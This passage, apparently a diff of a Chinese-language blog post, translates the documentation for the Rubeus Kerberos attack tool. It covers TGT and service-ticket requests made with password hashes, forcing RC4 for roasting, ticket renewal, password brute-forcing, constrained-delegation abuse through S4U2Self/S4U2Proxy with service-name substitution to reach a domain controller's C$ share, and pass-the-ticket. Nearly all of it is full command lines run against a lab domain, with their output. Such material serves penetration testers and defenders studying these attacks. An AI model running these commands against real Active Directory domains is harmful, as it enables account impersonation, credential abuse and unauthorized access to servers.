+    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
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+[*] Action: Describe Ticket
+
+UserName              :  dfm.a
+UserRealm             :  TESTLAB.LOCAL
+ServiceName           :  krbtgt/testlab.local
+ServiceRealm          :  TESTLAB.LOCAL
+StartTime             :  2/25/2019 3:06:07 PM
+EndTime               :  2/25/2019 8:06:07 PM
+RenewTill             :  3/4/2019 3:06:07 PM
+Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+KeyType               :  rc4_hmac
+Base64(key)           :  +zY8adXi2NuvkAxl1ohUOA==</code></pre>
+<p>通过 aes256_hmac hash 为 <strong><a href="mailto:&#x64;&#x66;&#109;&#46;&#97;&#x40;&#116;&#x65;&#x73;&#116;&#108;&#97;&#98;&#46;&#x6c;&#x6f;&#x63;&#x61;&#x6c;">&#x64;&#x66;&#109;&#46;&#97;&#x40;&#116;&#x65;&#x73;&#116;&#108;&#97;&#98;&#46;&#x6c;&#x6f;&#x63;&#x61;&#x6c;</a></strong> 用户请求一个票据，开启一个新的隐藏进程，并将票据应用于登录会话。（注意：需要管理员权限）</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /domain:testlab.local /aes256:e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27 /createnetonly:C:\Windows\System32\cmd.exe
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Create Process (/netonly)
+
+[*] Showing process : False
+[+] Process         : &#39;C:\Windows\System32\cmd.exe&#39; successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 7564
+[+] LUID            : 0x3c4c241
+
+[*] Action: Ask TGT
+
+[*] Using aes256_cts_hmac_sha1 hash: e27b2e7b39f59c3738813a9ba8c20cd5864946f179c80f60067f5cda59c3bd27
+[*] Target LUID : 63226433
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: &#39;testlab.local\dfm.a&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 234 bytes
+[*] Received 1620 bytes
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+    doIFujCCBbagAwIBBaEDAgEWooIEvzCCBL...(snip)...
+
+[*] Action: Import Ticket
+[*] Target LUID: 0x3c4c241
+[+] Ticket successfully imported!</code></pre>
+<p><strong>注意 /luid 和 /createnetonly 参数需要管理员权限</strong></p>
+<h3 id="asktgs"><a href="#asktgs" class="headerlink" title="asktgs"></a>asktgs</h3><p><strong>asktgs</strong> 操作将使用指定 TGT（通过 <code>/ticket:X</code> 参数）构建/解析原始 TGS-REQ/TGS-REP 服务票据请求。该值可以是 .kirbi 文件的 base64 编码，也可以是磁盘上 .kirbi 文件的路径。如果未指定 <code>/dc</code> 参数，则将使用计算机的当前域控制器，并将作为请求流量的目的地。<code>/ptt</code> 参数将进行 pass-the-ticket 并将得到的服务票据应用于当前登录会话。必须指定一个或多个 <code>/service:X</code> SPN，以逗号分隔</p>
+<p>构造的 TGS-REQ 种，支持的加密类型有 RC4_HMAC、 AES128_CTS_HMAC_SHA1、AES256_CTS_HMAC_SHA1。在这种情况下，KDC 将使用相互支持的最高加密方式来构建返回的服务票据。如果要强制使用 DES、RC4 或 AES128/256 密钥，请使用 <code>/enctype:[RC4|AES128|AES256|DES]</code>。</p>
+<p>为 dfm.a 用户请求一个 TGT，然后使用该票据，请求访问 “LDAP/primary.testlab.local” 和 “cifs/primary.testlab.local” 的服务票据：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe asktgt /user:dfm.a /rc4:2b576acbe6bcfda7294d6bd18041b8fe
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: &#39;testlab.local\dfm.a&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 230 bytes
+[*] Received 1537 bytes
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+    doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...
+
+C:\Rubeus&gt;Rubeus.exe asktgs /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip)... /service:LDAP/primary.testlab.local,cifs/primary.testlab.local /ptt
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+[*] Action: Ask TGS
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building TGS-REQ request for: &#39;LDAP/primary.testlab.local&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1514 bytes
+[*] Received 1562 bytes
+[+] TGS request successful!
+[*] base64(ticket.kirbi):
+
+    doIFzjCCBcqgAwIBBaEDAgEWoo...(snip)...
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+[*] Action: Ask TGS
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building TGS-REQ request for: &#39;cifs/primary.testlab.local&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1514 bytes
+[*] Received 1562 bytes
+[+] TGS request successful!
+[*] base64(ticket.kirbi):
+
+    doIFzjCCBcqgAwIBBaEDAgEWoo...(snip)...
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+
+C:\Rubeus&gt;Rubeus.exe klist
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: List Kerberos Tickets (Current User)
+
+    [0] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 2/10/2019 6:44:43 PM ; 2/10/2019 11:44:09 PM ; 2/17/2019 6:44:09 PM
+    Server Name       : cifs/primary.testlab.local @ TESTLAB.LOCAL
+    Client Name       : dfm.a @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)
+
+    [1] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 2/10/2019 6:44:43 PM ; 2/10/2019 11:44:09 PM ; 2/17/2019 6:44:09 PM
+    Server Name       : LDAP/primary.testlab.local @ TESTLAB.LOCAL
+    Client Name       : dfm.a @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, ok_as_delegate, pre_authent, renewable, forwardable (40a50000)</code></pre>
+<p>为一个启用了 AES 的服务账户，请求一个服务票据，指定我们仅支持 RC4_HMAC：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe asktgs /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip).../service:roast/me /enctype:rc4
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.4.1
+
+[*] Action: Ask TGS
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Requesting &#39;rc4_hmac&#39; etype for the service ticket
+[*] Building TGS-REQ request for: &#39;roast/me&#39;
+[+] TGS request successful!
+[*] base64(ticket.kirbi):
+
+    doIFrjCCBaqgAwIBBaEDA...(snip)...
+
+[*] Action: Describe Ticket
+
+UserName              :  dfm.a
+UserRealm             :  TESTLAB.LOCAL
+ServiceName           :  roast/me
+ServiceRealm          :  TESTLAB.LOCAL
+StartTime             :  2/25/2019 3:10:59 PM
+EndTime               :  2/25/2019 8:09:54 PM
+RenewTill             :  3/4/2019 3:09:54 PM
+Flags                 :  name_canonicalize, pre_authent, renewable, forwardable
+KeyType               :  rc4_hmac
+Base64(key)           :  Gg3zZicIl5c50KGecCf8XA==</code></pre>
+<h3 id="renew"><a href="#renew" class="headerlink" title="renew"></a>renew</h3><p><strong>renew</strong> 操作将使用 <code>/ticket:X</code> 指定的票据，建立/解析一个原始的 TGS-REQ/TGS-REP TGT 续订交换过程。这个值也可以设置为一个 .kirbi 文件的 base64 编码，或者是一次磁盘上的 .kirbi 文件的路径。如果未指定 <code>/dc</code> 参数，则将当前主机所在域的域控制器作为续订流量的目标。<code>/ptt</code> 参数将执行 pass-the-ticket ，并将生成的 kerberos 凭证用于当前登录会话。</p>
+<p>请注意，TGT 必须在其 ReTimeTill 窗口内 EndTime 之前续订。</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe renew /ticket:ticket.kirbi /ptt
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+[*] Action: Renew TGT
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building TGS-REQ renewal for: &#39;TESTLAB.LOCAL\dfm.a&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1506 bytes
+[*] Received 1510 bytes
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+    doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!</code></pre>
+<p><code>/autorenew</code> 参数将获取一个现有的 <code>/ticket:X</code> .kirbi 文件/blob，休眠直到 endTime - 30分钟，自动更新该票据，并显示刷新的票据 blob。它将继续此更新过程，直到被允许的 renew-till 续订窗口截止。</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe renew /ticket:doIFmjCCBZagAwIBBaEDAgEWoo...(snip)... /autorenew
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.3.3
+
+[*] Action: Auto-Renew TGT
+
+
+[*] User       : dfm.a@TESTLAB.LOCAL
+[*] endtime    : 2/10/2019 11:44:09 PM
+[*] renew-till : 2/17/2019 6:44:09 PM
+[*] Sleeping for 263 minutes (endTime-30) before the next renewal
+[*] Renewing TGT for dfm.a@TESTLAB.LOCAL
+
+[*] Action: Renew TGT
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building TGS-REQ renewal for: &#39;TESTLAB.LOCAL\dfm.a&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1506 bytes
+[*] Received 1510 bytes
+[+] TGT renewal request successful!
+[*] base64(ticket.kirbi):
+
+      doIFmjCCBZagAwIBBaEDAgEWoo...(snip)...</code></pre>
+<h3 id="brute"><a href="#brute" class="headerlink" title="brute"></a>brute</h3><p><strong>brute</strong> 操作将执行基于 kerberos 的密码暴力破解攻击。</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe brute /password:Password123!! /noticket
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[-] Blocked/Disabled user =&gt; Guest
+[-] Blocked/Disabled user =&gt; DefaultAccount
+[-] Blocked/Disabled user =&gt; krbtgt
+[-] Blocked/Disabled user =&gt; disabled
+[+] STUPENDOUS =&gt; newuser:Password123!!
+[*] base64(newuser.kirbi):
+
+      doIFLDCCBSigAwIBBaEDAgEWooIELDCCBChhggQkMIIEIKADAgEFoRAbDlR...(snip)...</code></pre>
+<h2 id="滥用受限委派"><a href="#滥用受限委派" class="headerlink" title="滥用受限委派"></a>滥用受限委派</h2><p>受限委派命令的类别：</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="#s4u">s4u</a></td>
+<td>执行 S4U2Self 和 S4U2Proxy 操作</td>
+</tr>
+</tbody></table>
+<h3 id="s4u"><a href="#s4u" class="headerlink" title="s4u"></a>s4u</h3><p><strong>s4u</strong> 操作几乎和 <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/kekeo/">Kekeo</a> 的 <strong>tgs::s4u</strong> 功能相同。如果将用户（或计算机）账户配置为受限委派（即在其 msds-allowedtodelegateto 字段中具有 SPN 值），则可以使用此操作来滥用对目标 SPN/服务器 的访问。受限委派很复杂。有关更多信息，请参考 <a target="_blank" rel="noopener" href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/">文章</a> 或者 Elad Shamir 的 <a target="_blank" rel="noopener" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html">“Wagging the Dog”</a> 文章。</p>
+<p><strong>TL;DR</strong> 的解释是，在被称为 S4U2Self 的过程种，允许启用了 “受限委派” 的账户可以以任何用户身份向自己请求票据。为了允许账户执行此操作，必须在其 useraccountcontrol 属性中启用  <strong>TrustedToAuthForDelegation</strong>，默认情况下，只有高级用户才能进行修改。此票据默认情况下设置了 <strong>FORWARDABLE</strong> 标志。然后，服务可以使用此票据来请求 “该服务账户 <strong>msds-allowedtodelegateto</strong> 字段中指定的任何 SPN” 的服务票据。简而言之，如果宁控制的账户设置了 <strong>TrustedToAuthForDelegation</strong> 且 <strong>msds-allowedtodelegateto</strong> 具有 SPN 值，那么你可以冒充成域中的任何用户来访问 该服务账户中 <strong>msds-allowedtodelegateto</strong> 字段中的 SPN/服务。</p>
+<p>该 “控件” 可以是账户的 hash 值（<code>/rc4</code> 或 <code>/aes256</code>），也可以是已设置了 <strong>msds-allowedtodelegateto</strong> 的账户的现有 TGT（<code>/ticket:X</code>）。如果提供了 <code>/user</code> 和 rc4/aes256 hash，则 S4U 模块会先使用返回的票据执行 <a href="#asktgt">asktgt</a> 操作。如果提供了 TGT <code>/ticket:X</code>，则使用该 TGT。</p>
+<p><code>/impersonateuser:X</code> 参数是必填的，如果未填，则只执行 S4U2Self ，返回一个可转发票据： </p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: &#39;testlab.local\patsy&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 230 bytes
+[*] Received 1377 bytes
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+    doIE+jCCBPagAwIBBaEDAgEWoo...(snip)...
+
+
+[*] Action: S4U
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building S4U2self request for: &#39;TESTLAB.LOCAL\patsy&#39;
+[*] Sending S4U2self request
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1437 bytes
+[*] Received 1574 bytes
+[+] S4U2self success!
+[*] Got a TGS for &#39;dfm.a@TESTLAB.LOCAL&#39; to &#39;TESTLAB.LOCAL\patsy&#39;
+[*] base64(ticket.kirbi):
+
+    doIF2jCCBdagAwIBBaEDAgEWoo...(snip)...</code></pre>
+<p>可转发票据可以作为 <code>/tgs:Y</code> 参数（base64 blob 或 .kirbi 文件）来执行 S4U2Proxy 过程。必须提供该账户的有效 <strong>msds-allowedtodelegateto</strong> 值（<code>/msdsspn:X</code>）。假设 <strong><a href="mailto:&#112;&#x61;&#116;&#115;&#121;&#x40;&#116;&#101;&#x73;&#116;&#x6c;&#97;&#98;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x6c;">&#112;&#x61;&#116;&#115;&#121;&#x40;&#116;&#101;&#x73;&#116;&#x6c;&#97;&#98;&#x2e;&#x6c;&#x6f;&#x63;&#x61;&#x6c;</a></strong> 账户如下所示：</p>
+<pre><code>PS C:\&gt; Get-DomainUser patsy -Properties samaccountname,msds-allowedtodelegateto | Select -Expand msds-allowedtodelegateto
+ldap/PRIMARY.testlab.local/testlab.local
+ldap/PRIMARY
+ldap/PRIMARY.testlab.local/TESTLAB
+ldap/PRIMARY/TESTLAB
+ldap/PRIMARY.testlab.local/DomainDnsZones.testlab.local
+ldap/PRIMARY.testlab.local/ForestDnsZones.testlab.local
+ldap/PRIMARY.testlab.local</code></pre>
+<p>然后滥用 S4U2Proxy 功能（使用之前从 S4U2Self 过程中获得的票据）：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe s4u /ticket:doIE+jCCBPagAwIBBaEDAgEWoo..(snip).. /msdsspn:&quot;ldap/PRIMARY.testlab.local&quot; /tgs:doIF2jCCBdagAwIBBaEDAgEWoo..(snip)..
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+[*] Action: S4U
+
+[*] Loaded a TGS for TESTLAB.LOCAL\dfm.a@TESTLAB.LOCAL
+[*] Impersonating user &#39;dfm.a@TESTLAB.LOCAL&#39; to target SPN &#39;ldap/PRIMARY.testlab.local&#39;
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building S4U2proxy request for service: &#39;ldap/PRIMARY.testlab.local&#39;
+[*] Sending S4U2proxy request
+[*] Connecting to 192.168.52.100:88
+[*] Sent 2641 bytes
+[*] Received 1829 bytes
+[+] S4U2proxy success!
+[*] base64(ticket.kirbi) for SPN &#39;ldap/PRIMARY.testlab.local&#39;:
+
+    doIGujCCBragAwIBBaEDAgEWoo..(snip)..</code></pre>
+<p>其中 <code>/ticket:X</code> 是第一步返回的 TGT，<code>/tgs</code> 是 S4U2Self 票据。注入结果票据（手动使用  <a href="#ptt">Rubeus.exe ptt /ticket:X</a> 或在  <strong>s4u</strong> 中提供 <code>/ptt</code> 参数）将允许你以 dfm.a 身份访问 primary.testlab.local 上的 <strong>LDAP</strong> 服务</p>
+<p><code>/altservice</code> 参数利用 <a target="_blank" rel="noopener" href="https://twitter.com/agsolino">Alberto Solino</a> 的重大发现 <a target="_blank" rel="noopener" href="https://www.coresecurity.com/blog/kerberos-delegation-spns-and-more">how the service name (sname) is not protected in the KRB-CRED file</a>，我们可以访问同一服务器上其他任意服务。这允许我们在生成的 KRB-CRED（.kirbi）文件中，替换任何我们想要的服务名称。可以提供一个或多个备用服务名称，以逗号分隔（<code>/altservice:cifs,HOST,...</code>）</p>
+<p>让我们拓展前面的实例，通过滥用受限委派配置 和 替换服务名，来建立对 primary.testlab.local 上文件系统的访问。让我们将所有的内容打包在一个步骤中，包括：执行一个 TGT 请求、S4USelf 过程、S4U2Proxy 过程，以及注入 TGS 票据：</p>
+<pre><code>C:\Rubeus&gt;dir \\primary.testlab.local\C$
+Access is denied.
+
+C:\Rubeus&gt;Rubeus.exe s4u /user:patsy /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:dfm.a /msdsspn:&quot;ldap/PRIMARY.testlab.local&quot; /altservice:cifs /ptt
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+[*] Action: Ask TGT
+
+[*] Using rc4_hmac hash: 2b576acbe6bcfda7294d6bd18041b8fe
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building AS-REQ (w/ preauth) for: &#39;testlab.local\patsy&#39;
+[*] Connecting to 192.168.52.100:88
+[*] Sent 230 bytes
+[*] Received 1377 bytes
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+    doIE+jCCBPagAwIBBaEDAgEWoo..(snip)..
+
+
+[*] Action: S4U
+
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building S4U2self request for: &#39;TESTLAB.LOCAL\patsy&#39;
+[*] Sending S4U2self request
+[*] Connecting to 192.168.52.100:88
+[*] Sent 1437 bytes
+[*] Received 1574 bytes
+[+] S4U2self success!
+[*] Got a TGS for &#39;dfm.a@TESTLAB.LOCAL&#39; to &#39;TESTLAB.LOCAL\patsy&#39;
+[*] base64(ticket.kirbi):
+
+    doIF2jCCBdagAwIBBaEDAgEWoo..(snip)..
+
+[*] Impersonating user &#39;dfm.a&#39; to target SPN &#39;ldap/PRIMARY.testlab.local&#39;
+[*]   Final ticket will be for the alternate service &#39;cifs&#39;
+[*] Using domain controller: PRIMARY.testlab.local (192.168.52.100)
+[*] Building S4U2proxy request for service: &#39;ldap/PRIMARY.testlab.local&#39;
+[*] Sending S4U2proxy request
+[*] Connecting to 192.168.52.100:88
+[*] Sent 2641 bytes
+[*] Received 1829 bytes
+[+] S4U2proxy success!
+[*] Substituting alternative service name &#39;cifs&#39;
+[*] base64(ticket.kirbi) for SPN &#39;cifs/PRIMARY.testlab.local&#39;:
+
+    doIGujCCBragAwIBBaEDAgEWoo..(snip)..
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+C:\Rubeus&gt;dir \\primary.testlab.local\C$
+Volume in drive \\primary.testlab.local\C$ has no label.
+Volume Serial Number is A48B-4D68
+
+Directory of \\primary.testlab.local\C$
+
+07/05/2018  12:57 PM    &lt;DIR&gt;          dumps
+03/05/2017  04:36 PM    &lt;DIR&gt;          inetpub
+08/22/2013  07:52 AM    &lt;DIR&gt;          PerfLogs
+04/15/2017  05:25 PM    &lt;DIR&gt;          profiles
+08/28/2018  11:51 AM    &lt;DIR&gt;          Program Files
+08/28/2018  11:51 AM    &lt;DIR&gt;          Program Files (x86)
+10/09/2018  12:04 PM    &lt;DIR&gt;          Temp
+08/23/2018  03:52 PM    &lt;DIR&gt;          Users
+10/25/2018  01:15 PM    &lt;DIR&gt;          Windows
+            1 File(s)              9 bytes
+            9 Dir(s)  40,511,676,416 bytes free</code></pre>
+<h2 id="票据管理"><a href="#票据管理" class="headerlink" title="票据管理"></a>票据管理</h2><p>票据管理命令的类别</p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="#ptt">ptt</a></td>
+<td>应用一个票据到当前（或特定）的登录会话中</td>
+</tr>
+<tr>
+<td><a href="#purge">purge</a></td>
+<td>清除当前（或特定）登录会话中的票据</td>
+</tr>
+<tr>
+<td><a href="#describe">describe</a></td>
+<td>描述一个票据（base64 blob 或 .kirbi 文件）</td>
+</tr>
+</tbody></table>
+<h3 id="ptt"><a href="#ptt" class="headerlink" title="ptt"></a>ptt</h3><p><strong>ptt</strong> 操作将通过带有  KERB_SUBMIT_TKT_REQUEST 消息的 LsaCallAuthenticationPackage() API ，为当前登录会话提交 <code>/ticket:X</code>（TGT 或服务票据），或者（如果是管理员权限）先登录提交 <code>/luid:0xA..</code> 指定的会话。与其他 <code>/ticket:X</code> 参数一样，该值可以是 .kirbi 文件的 base64 编码，也可以是磁盘上的 .kirbi 文件的路径。</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe ptt /ticket:doIFmjCCBZagAwIBBaEDAgEWoo..(snip)..
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+[*] Action: Import Ticket
+[+] Ticket successfully imported!
+
+C:\Rubeus&gt;Rubeus.exe klist
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+
+[*] Action: List Kerberos Tickets (Current User)
+
+    [0] - 0x12 - aes256_cts_hmac_sha1
+    Start/End/MaxRenew: 2/11/2019 2:55:18 PM ; 2/11/2019 7:55:18 PM ; 2/18/2019 2:55:18 PM
+    Server Name       : krbtgt/testlab.local @ TESTLAB.LOCAL
+    Client Name       : dfm.a @ TESTLAB.LOCAL
+    Flags             : name_canonicalize, pre_authent, initial, renewable, forwardable (40e10000)</code></pre>
+<p><strong>已提权的情况下</strong> 将票据应用于其他登录会话：</p>
+<pre><code>C:\Rubeus&gt;Rubeus.exe klist /luid:0x474722b
+
+ ______        _
+(_____ \      | |
+ _____) )_   _| |__  _____ _   _  ___
+|  __  /| | | |  _ \| ___ | | | |/___)
+| |  \ \| |_| | |_) ) ____| |_| |___ |
+|_|   |_|____/|____/|_____)____/(___/
+
+v1.3.3
+
+
+
+[*] Action: List Kerberos Tickets (All Users)
+
+[*] Target LUID     : 0x474722b
+
+UserName                 : patsy
+Domain                   : TESTLAB
+LogonId                  : 0x474722b
+UserSID                  : S-1-5-21-883232822-274137685-4173207997-1169
+AuthenticationPackage    : Kerberos
+LogonType                : Interactive
+LogonTime                : 2/11/2019 10:58:53 PM
